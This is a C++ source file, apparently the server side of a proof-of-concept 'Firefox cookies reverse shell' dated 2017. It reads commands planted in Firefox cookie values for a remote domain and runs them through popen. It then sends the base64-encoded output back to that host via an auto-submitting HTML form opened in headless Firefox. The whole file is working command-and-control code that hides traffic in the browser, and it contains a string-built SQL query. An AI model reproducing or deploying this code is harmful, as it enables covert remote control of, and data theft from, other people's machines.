/*
Firefox's cookies reverse shell - PoC version - THis is Server!

Coded by CoolerVoid - 17/12/2017

read docs	
	
*/
#include "utils.h"
using namespace std;

 std::string domain;
 
static inline bool is_base64(unsigned char z) 
{
	return (isalnum(z) || (z == '+') || (z == '/'));
}

std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) 
{
	std::string ret;
	int i = 0, j = 0;
	unsigned char array1[3], array2[4];

	while(in_len--) 
	{
		array1[i++] = *(bytes_to_encode++);
		if(i == 3) 
		{
			array2[0] = (array1[0] & 0xfc) >> 2;
			array2[1] = ((array1[0] & 0x03) << 4) + ((array1[1] & 0xf0) >> 4);
			array2[2] = ((array1[1] & 0x0f) << 2) + ((array1[2] & 0xc0) >> 6);
			array2[3] = array1[2] & 0x3f;

			for(i = 0; (i <4) ; i++)
				ret += base64_chars[array2[i]];
			i = 0;
		}
	}

	if(i)
	{
		for(j = i; j < 3; j++)
			array1[j] = '\0';

		array2[0] = (array1[0] & 0xfc) >> 2;
		array2[1] = ((array1[0] & 0x03) << 4) + ((array1[1] & 0xf0) >> 4);
		array2[2] = ((array1[1] & 0x0f) << 2) + ((array1[2] & 0xc0) >> 6);
		array2[3] = array1[2] & 0x3f;

		for(j = 0; (j < i + 1); j++)
			ret += base64_chars[array2[j]];

		while((i++ < 3))
			ret += '=';

	}

	return ret;

}

std::string base64_decode(std::string const& encoded_string) 
{
	int in_len = encoded_string.size(),i = 0,j = 0,in_ = 0;
	unsigned char array1[3], array2[4];
	std::string ret;

	while(in_len-- && ( encoded_string[in_] != '=') && is_base64(encoded_string[in_])) 
	{
		array2[i++] = encoded_string[in_]; in_++;
		if(i==4) 
		{
			for (i = 0; i <4; i++)
				array2[i] = base64_chars.find(array2[i]);

			array1[0] = (array2[0] << 2) + ((array2[1] & 0x30) >> 4);
			array1[1] = ((array2[1] & 0xf) << 4) + ((array2[2] & 0x3c) >> 2);
			array1[2] = ((array2[2] & 0x3) << 6) + array2[3];

			for (i = 0; (i < 3); i++)
				ret += array1[i];
			i = 0;
		}
	}

	if(i) 
	{
		for(j = i; j <4; j++)
			array2[j] = 0;

		for(j = 0; j <4; j++)
			array2[j] = base64_chars.find(array2[j]);

		array1[0] = (array2[0] << 2) + ((array2[1] & 0x30) >> 4);
		array1[1] = ((array2[1] & 0xf) << 4) + ((array2[2] & 0x3c) >> 2);
		array1[2] = ((array2[2] & 0x3) << 6) + array2[3];

		for (j = 0; (j < i - 1); j++) 
			ret += array1[j];
	}

	return ret;
}			 

std::string readfile(const std::string &filepath)
{
	std::string buffer;
	std::ifstream fin(filepath.c_str());
	getline(fin, buffer, char(-1));
	fin.close();
	
	return buffer;
} 
 
std::string exec_command(std::string cmd) 
{
	std::array<char, 128> buffer;
    	std::string result;
    	std::shared_ptr<FILE> pipe(popen(cmd.c_str(), "r"), pclose);

    	if(!pipe) throw std::runtime_error("popen() failed!");

    	while(!feof(pipe.get())) 
	{
        	if(fgets(buffer.data(), 128, pipe.get()) != nullptr)
            		result += buffer.data();
    	}

    	return result;
}
 
std::string get_unix_username()
{
	struct passwd *pw;
	uid_t uid;
	int c;

        uid = geteuid();
        pw = getpwuid(uid);
        if(pw)
                return std::string(pw->pw_name);
          
        return std::string("");
} 
 
std::string get_default_firefox_profiledir(const std::string& name)
{
	DIR *dir = opendir(name.c_str()); 

    	if(dir) 
    	{ 
        	struct dirent *ent; 

        	while((ent = readdir(dir)) != NULL) 
        	{  
			std::string test=ent->d_name;
 
                	if(test.find("presto4")!=string::npos)                                 
				return test;

   
        	} 
    	} 
    	else  
        	cout << "Error opening directory" << endl; 

	return "error";
    
}

std::string get_firefox_sqlite_path()
{
	std::string user=get_unix_username();
	std::string path="/home/"+user+"/.mozilla/firefox/";
	std::string database_dir=get_default_firefox_profiledir(path);
	std::string database_path;
    	database_path=path+database_dir+"/cookies.sqlite";	

	return database_path;
}

// write  cmd command in coookie
void write_cmd_cookie()
{
	std::string str1="http://", str2="/firefox_shell/firefox_cmd_tunnel.php";
	std::string path=str1+domain+str2;
	std::string firefox_params="/usr/bin/timeout 2s /usr/bin/firefox -P \"presto4\" -headless -url "+path;
	cout << firefox_params+"\n" << endl;
	std::system(firefox_params.c_str());	
}

void Write_File(std::string filename, std::string buf) 
{
	ofstream myfile;
  	myfile.open (filename);
  	myfile << buf;
  	myfile.close();
}

void construct_html(std::string result_cmd,  std::string filename)
{
	std::string content_html;
	std::string result_base64=base64_encode(reinterpret_cast<const unsigned char*>(result_cmd.c_str()),result_cmd.length() );
	content_html="<html><form enctype=\"application/x-www-form-urlencoded\" id=\"autopost\" method=\"POST\" action=\"http://"+domain+"/firefox_shell/firefox_cmd_tunnel.php\">";
	content_html+="<table><tr><td>result</td><td><input type=\"text\" value=\""+result_base64+"\" name=\"result\">";
	content_html+="</td></tr></table><input type=\"submit\"></form>";
	content_html+="<script>document.getElementById(\"autopost\").submit();</script></html>";
	Write_File(filename,content_html);
}

void send_result_cmd(std::string html_file)
{
	std::string firefox_params="/usr/bin/timeout 2s /usr/bin/firefox -P \"presto4\" -headless "+html_file;	
	cout << firefox_params+"\n" << endl;
	std::system(firefox_params.c_str());
//todo add error test...	
}


static int callback(void *data, int argc, char **argv, char **azColName)
{
   	int i=0;
   
   	while(i<argc)
   	{
		if(i==4) 
	  	{
			std::string command=base64_decode(argv[i]);
			std::string  result_cmd=exec_command(command);
			construct_html(result_cmd,  "output.html");
			send_result_cmd("output.html");
	  	}
	  	i++;
   	}
   
   	return 0;
}

void start_cookie_tunnel()
{
	std::string cmd;
	// at the future if remote_server turn in user input, todo is sanitize this item to do SQL injection mitigation
	std::string query = "SELECT * from moz_cookies WHERE host = '"+domain+"';";
	std::string tmp = get_firefox_sqlite_path();
	sqlite3 *db;
    	char *zErrMsg = 0;
    	int rc;
	
    	rc = sqlite3_open(tmp.c_str(), &db);
	
    	if(rc)
	{
      		fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
      		sqlite3_close(db);
      		exit(0);
    	}

    	rc = sqlite3_exec(db, query.c_str(), callback, 0, &zErrMsg);
	
    	if(rc!=SQLITE_OK)
	{
		fprintf(stderr, "SQL error: %s\n", zErrMsg);
		sqlite3_free(zErrMsg);
    	}
	
    	sqlite3_close(db);
}
